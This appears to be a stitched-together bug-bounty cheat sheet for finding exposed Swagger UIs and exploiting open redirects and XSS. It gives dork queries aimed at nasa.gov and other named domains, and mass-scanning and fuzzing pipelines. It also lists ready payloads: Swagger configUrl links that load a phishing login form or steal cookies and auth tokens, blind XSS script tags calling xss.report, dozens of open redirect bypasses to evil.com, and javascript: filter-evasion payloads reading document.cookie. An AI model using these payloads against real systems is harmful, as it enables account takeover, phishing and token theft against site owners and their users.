C√≥mo encontrar API expuestas con Google Dorks
# 1. Find non-root subdomains of swagger.io with exposed Swagger UI
site:*.swagger.io -www ‚Äî Discover test/dev subdomains under swagger.io exposing Swagger UI.

# 2. Find Swagger UI on a specific target domain
intext:"Swagger UI" intitle:"Swagger UI" site:Target.com ‚Äî Locate pages on a specific domain where Swagger UI is active.

# 3. Search for Swagger endpoints on NASA's domain
site:nasa.gov inurl:(swagger-ui OR swagger.json OR swagger.yaml) ‚Äî Identify Swagger interfaces or specs exposed on nasa.gov.

# 4. Locate default Swagger UI paths
inurl:"/swagger-ui/index.html" ‚Äî Target the default Swagger UI landing page used by many APIs.

# 5. Advanced: Find Swagger UI across multiple paths and file types on NASA
intitle:"Swagger UI" (inurl:"/swagger-ui/" OR inurl:"/swagger/" OR inurl:"/api-docs/" OR inurl:"/v2/api-docs" OR inurl:"/v3/api-docs" OR inurl:"swagger.json" OR inurl:"swagger.yaml") -github -gitlab -stackoverflow site:nasa.gov ‚Äî Combine multiple common Swagger UI paths while filtering dev platform noise.

# 6. Find exposed API spec files in common API folders on NASA
site:nasa.gov (inurl:api OR inurl:apis OR inurl:graphql OR inurl:swagger OR inurl:v1 OR inurl:v2 OR inurl:v3) (filetype:json OR filetype:yaml OR filetype:xml) ‚Äî Discover JSON/YAML/XML API schema files across known API directories.

Automating Google Dork Results

python dorking.py
cat swagger.txt | awk -F/ '{print $3}' | sort -u
cat swagger.txt | awk -F/ '{print $3}' | sort -u | nuclei -t Swagger.yaml


Hunting Swagger Endpoints via GitHub Dorks

# 1. Find outdated Swagger UI versions in GitHub repos
"/swagger-ui-dist\": \"3.[1-3]/" path:*/package.json ‚Äî Locate GitHub projects using vulnerable Swagger UI versions 3.1 to 3.3 via package.json files.

# 2. Search GitHub repos for hardcoded URLs or endpoints
repo:ORG/REPO ("https://" OR "http://" OR ".com") ‚Äî Identify hardcoded links or endpoints in a specific GitHub repo, which may expose Swagger instances or API hosts.
Example: repo:strapi/strapi ("https://" OR "http://" OR ".com")

This reveals apps using vulnerable versions. Look inside for:

Host URLs
API schemas
Live Swagger URLs



Using Censys to find Public Swagger UIs

# 1. Censys: Find Swagger keywords in HTTP response bodies using host field
host.services.endpoints.http.body:{"swagger", "swagger-ui"} ‚Äî Search for servers indexed by Censys that return Swagger-related content in HTTP response bodies.

# 2. Censys: Alternative search using web field path
web.endpoints.http.body:{"swagger", "swagger-ui"} ‚Äî Identify Swagger UI presence using the alternative `web.endpoints.http.body` field in Censys data.

# 3. Censys: Search for Swagger mentions on NASA infrastructure
nasa AND host.services.endpoints.http.body:{"swagger", "swagger-ui"} OR web.endpoints.http.body:{"swagger", "swagger-ui"} ‚Äî Locate Swagger UIs across NASA-tagged services by searching HTTP body content.

# 4. Censys: Find Swagger exposures on NASA-tagged IPs with response analysis
(nasa AND host.services.endpoints.http.body:{"swagger", "swagger-ui"} OR web.endpoints.http.body:{"swagger", "swagger-ui"}) AND host.ip:* ‚Äî Deep search across Censys for Swagger mentions tied to NASA-related IP addresses.


Finding Swagger UIs with Fofa Queries
"redacted.com" && (icon_hash="-1180440057" || icon_hash="-1128940573" || icon_hash="-1839822816" || icon_hash="1120729672")



Finding Exposed Swagger Interfaces Using Shodan

# 1. Shodan: Detect services with Swagger identified in components
http.component:"Swagger" ‚Äî Find services where Shodan has recognized Swagger as a web component (useful for direct Swagger UI identification).

# 2. Shodan: Search for pages titled "Swagger UI"
http.title:"Swagger UI" ‚Äî Locate web servers that display ‚ÄúSwagger UI‚Äù in the HTML <title>, a common trait of Swagger interfaces.

# 3. Shodan: Find pages containing "swagger-ui" in the HTML body
http.html:"swagger-ui" ‚Äî Match servers whose HTML response contains the string ‚Äúswagger-ui‚Äù, pointing to exposed interfaces.

# 4. Shodan: Combined filter for highly accurate Swagger UI detection
http.component:"Swagger" http.title:"Swagger UI" http.html:"swagger-ui" ‚Äî Combine component, title, and body filters for more precise Swagger UI discovery.

# 5. Shodan: Identify Swagger UIs using known favicon hash
http.favicon.hash:"-1128940573" ‚Äî Match services using the default Swagger UI favicon (great for fingerprinting Swagger across the web).

# 6. Shodan: Search for pages with title ‚ÄúSwagger UI‚Äù returning 200 OK
http.title:"Swagger UI" +200 ‚Äî Narrow Swagger UI results to only those returning HTTP 200 (live and accessible).

# 7. Shodan: Look for Swagger UI on a specific domain
http.title:"Swagger UI" hostname:"getsling.com" ‚Äî Locate active Swagger UIs specifically on the domain `getsling.com`.


Mass Hunting using Shodan facet analysis

# 1. Extract IPs and export to a text file
var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='ip.txt';document.body.appendChild(a);a.click();

# 2. Extract Doamins name and export to a text file
var ipElements=document.querySelectorAll('strong'),ips=[],domains=[];ipElements.forEach(function(e){var t=e.innerHTML.replace(/['"]/g,'').trim();/^(\d{1,3}\.){3}\d{1,3}$/.test(t)?ips.push(t):/^(?!\d+\.)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t)&&domains.push(t)});var dataString='IPs:\n'+ips.join('\n')+'\n\nDomains:\n'+domains.join('\n'),a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(dataString);a.download='domains.txt';document.body.appendChild(a);a.click();


cat ip.txt | sort -u| nuclei -t Swagger.yaml
cat domains.txt | sort -u | nuclei -t Swagger.yaml



Automation with Subfinder and Httpx

# 1. Find Swagger UI on all subdomains of a target
subfinder -d target.com -all | httpx-toolkit -silent -title | grep "Swagger UI" ‚Äî Enumerate all subdomains, probe them for HTTP responses, and filter those with a "Swagger UI" page title.

# 2. Detect Swagger, OpenAPI, Redoc, or RapiDoc on a list of domains
cat swagger.txt | httpx-toolkit -silent -title | grep -Ei "swagger|openapi|redoc|rapidoc" ‚Äî Scan each domain in `swagger.txt` for exposed API docs by checking page titles for popular documentation keywords.

# 3. Probe common Swagger documentation paths on a single domain
echo "example.com" | httpx -path /docs,/swagger,/api-docs,/swagger-ui,/swagger-ui.html ‚Äî Check if specific Swagger/OpenAPI paths are reachable on a given domain.



Path Brute-Forcing with Custom Wordlists

ffuf -w /root/wordlist/api/swagger_xss.txt:FUZZ -w alive_ones.txt:URL -u URLFUZZ -mc 200 -o ffuf-result.txt

dirsearch -u https://api.getsling.com -w payloads/swagger.txt -e html,json,yaml,js -t 20 --random-agent --force-recursive --full-url



DOM XSS via Swagger UI in Jamf Pro
https://VULNERABLE_JAMF/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==

/index.html?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy9tYWluL2hlbHBlcnMvcGF5bG9hZHMvc3dhZ2dlci1wYXlsb2FkIgp9'
alert(localStorage.getItem('authToken'))


Dom XSS & HTML Injection & Open Redirect


# 1. Loads a custom Swagger login form template for login phishing 
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/login.json

# 2. Tests open redirect behavior via a redirecting login config
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/rlogin.json

# 3. Triggers a basic XSS payload to check for DOM-based vulnerabilities
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsstest.json

# 4. Executes a script to exfiltrate cookies or auth tokens from localStorage
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsscookie.json





-------------------------------------------------------------------------------------------------------------------------
Step 5: Scaling Up with Automation Scripts
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10  --headers "User-Agent: Mozilla/5.0"


subfinder -d vulnweb.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
subfinder -d vulnweb.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"


---------------------------------------------------------------------------------------------------------------------------------


----------------------------------------------------------------------------------------------------------------------------------


Understanding Open Redirect Basics

--------------------------------------------------------------------------------------------------------------------------------


https://example.com/redirect?url=http://malicious.com


Manual Testing Techniques
1. Simply Change the Domain

?redirect=https://example.com ‚Üí ?redirect=https://evil.com
2. Bypass When Protocol is Blacklisted

?redirect=https://example.com ‚Üí ?redirect=//evil.com
3. Bypass When Double Slash is Blacklisted

?redirect=https://example.com ‚Üí ?redirect=\\evil.com
4. Bypass Using http: or https:

?redirect=https://example.com ‚Üí ?redirect=https:example.com
5. Bypass Using %40 (At Symbol Encoding)

?redirect=example.com ‚Üí ?redirect=example.com%40evil.com
6. Bypass if Only Checking for Domain Name

?redirect=example.com ‚Üí ?redirect=example.comevil.com
7. Bypass Using Dot Encoding %2e

?redirect=example.com ‚Üí ?redirect=example.com%2eevil.com
8. Bypass Using a Question Mark

?redirect=example.com ‚Üí ?redirect=evil.com?example.com
9. Bypass Using Hash %23

?redirect=example.com ‚Üí ?redirect=evil.com%23example.com
10. Bypass Using a Symbol

?redirect=example.com ‚Üí ?redirect=example.com/evil.com
11. Bypass Using URL Encoded Chinese Dot %E3%80%82

?redirect=example.com ‚Üí ?redirect=evil.com%E3%80%82%23example.com
12. Bypass Using a Null Byte %0d or %0a

?redirect=/ ‚Üí ?redirect=/%0d/evil.com
13. Encoded URL Redirects

https://example.com/redirect?url=http%3A%2F%2Fmalicious.com
14. Path-Based Redirects

https://example.com/redirect/http://malicious.com
15. Data URI Redirects

https://example.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyBpcyBhbiBhdHRhY2snKTwvc2NyaXB0Pg==
16. JavaScript Scheme Redirects

https://example.com/redirect?url=javascript:alert('XSS');//
17. Open Redirect via HTTP Header

Location: http://malicious.com
X-Forwarded-Host: evil.com
Refresh: 0; url=http://malicious.com
18. Path Traversal Hybrids

/redirect?url=/../../https://evil.com
19. Using svg paylaod

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com/'" xmlns="http://www.w3.org/2000/svg"></svg>
20. Case-sensitive Variations

//GOOGLE.com/ ‚Üí Bypass on case-sensitive filters
//GoOgLe.com/ ‚Üí Random casing to evade blacklists
21. Trailing Special Characters

//google.com/#/ ‚Üí Fragment to obscure final redirect
//google.com/;&/ ‚Üí Extra characters after domain
//google.com/?id=123&// ‚Üí Obfuscated with trailing ampersands
22. IP Address Variants

http://3232235777 ‚Üí Decimal IP for 192.168.1.1
http://0xC0A80001 ‚Üí Hexadecimal IP
http://192.168.1.1/ ‚Üí Normal IP address
23. IPv6 Notation

http://[::1]/ ‚Üí IPv6 loopback
http://[::ffff:192.168.1.1]/ ‚Üí IPv4-mapped IPv6
24. Non-standard Ports

http://google.com:81 ‚Üí Different port used
https://google.com:444 ‚Üí May bypass filters by port
25. Unicode Obfuscation in Paths

/%E2%80%http://8Egoogle.com ‚Üí Unicode injection
/%C2%http://A0google.com ‚Üí More unicode obfuscation
Automated Tools for Scanning
Reconnaissance
Collect multiple active and passive URLs from all available tools and sources.

For single domain:

echo target.com | gau --o urls1.txt
echo target.com | katana -d 2 -o urls2.txt
echo target.com | urlfinder -o urls3.txt
echo target.com | hakrawler > urls4.txt
For multiple subdomains:

subfinder -d target.com -all -o subdomains1.txt
assetfinder --subs-only target.com > subdomains2.txt
sort -u subdomains.txt subdomains2.txt -o uniqsubs.txt
cat uniqsubs.txt | httpx-toolkit -o finallist.txt

cat finallist.txt | gau --o urls1.txt
cat finallist.txt | katana -d 2 -o urls2.txt
cat finallist.txt | urlfinder -o urls3.txt
cat finallist.txt | hakrawler > urls4.txt
After collecting all the URLs its time to filter out duplicates and sort them.

cat urls1.txt urls2.txt urls3.txt | uro | sort -u | tee final.txt
Filtering URLs for Redirect Parameters
Using the grep command to filter out all open redirect parameters used for redirections:

cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
A more effective approach is to use the gf tool pattern to filter only open redirect parameters with the following command:

final.txt | gf redirect | uro | sort -u | tee redirect_params.txt



cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"


subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"


cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"


echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"


subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"


Fuzzing with FFuF and Verifying in Burpsuite

ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD -u "https://site.com/bitrix/redirect.php?PARAM=PAYLOAD" -mc 301,302,303,307,308 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -x http://localip:8080 -t 10 -mr "Location: http://google.com"

-mc : Match only 301,302,303,307,308 redirect responses.
-mr : Confirm redirect to a malicious domain ‚ÄúLocation: http://google.com"
-x: This option is used to proxy FFUF traffic through Burp Suite for manual testing.
-w for wordlist: redirect_param.txt contains all openredirect params and or.txt file contains all openredirect bypass paylaods



 cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}


Testing Using Nuclei Template


echo subdomains.txt | nuclei -t openRedirect.yaml -c 30


----Using virustotal
https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=target.com

./virustotal.sh domains.txt | gf redirect

--------Using Loxs tool
cat urls.txt | sed 's/=.*/=/' | uro >final.txt

Openredirect to XSS(ATO)

#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/

Google Dorking & Automation

site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)


inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target


cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com" 

cat urls.txt| gf redirect | uro | while read url; do cat /home/coffinxp/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"





git clone

https://github.com/coffinxp/swagger?source=post_page-----1b670972a443---------------------------------------
https://github.com/coffinxp/swagger/blob/main/swagger-wordlist.txt?source=post_page-----1b670972a443---------------------------------------
https://sites.google.com/site/linkgopher/?source=post_page-----1b670972a443---------------------------------------
https://github.com/mandatoryprogrammer/xsshunter-express?source=post_page-----fc9e6ced5b0b---------------------------------------
https://xss.report/?source=post_page-----fc9e6ced5b0b---------------------------------------
https://github.com/SeifElsallamy/Blind-XSS-Manager?source=post_page-----fc9e6ced5b0b---------------------------------------
https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?source=post_page-----fc9e6ced5b0b---------------------------------------&pli=1
https://github.com/coffinxp/Image-EXIF-Data?source=post_page-----fc9e6ced5b0b---------------------------------------
https://github.com/coffinxp/GFpattren/blob/main/redirect.json?source=post_page-----fdb80286236e---------------------------------------
https://github.com/coffinxp/loxs/blob/main/payloads/or.txt?source=post_page-----fdb80286236e---------------------------------------
https://github.com/coffinxp/loxs
sudo apt --fix-broken install
2. Descarga chromedriver oficial
wget https://chromedriver.storage.googleapis.com/114.0.5735.90/chromedriver_linux64.zip
unzip chromedriver_linux64.zip
3. Mu√©velo a sistema
sudo mv chromedriver /usr/bin/
sudo chmod +x /usr/bin/chromedriver
4. Verifica
chromedriver --version
Debe mostrar algo como:

ChromeDriver 114.0....
‚úÖ OPCI√ìN 2 ‚Äî LA M√ÅS LIMPIA PARA TU SCRIPT
Ni siquiera necesitas Chromium completo.
Tu scanner solo usa Selenium para renderizar.

Modifica en:

üìÅ loxs.py

Busca:

Service(ChromeDriverManager().install())
Y d√©jalo as√≠:

Service("/usr/bin/chromedriver")
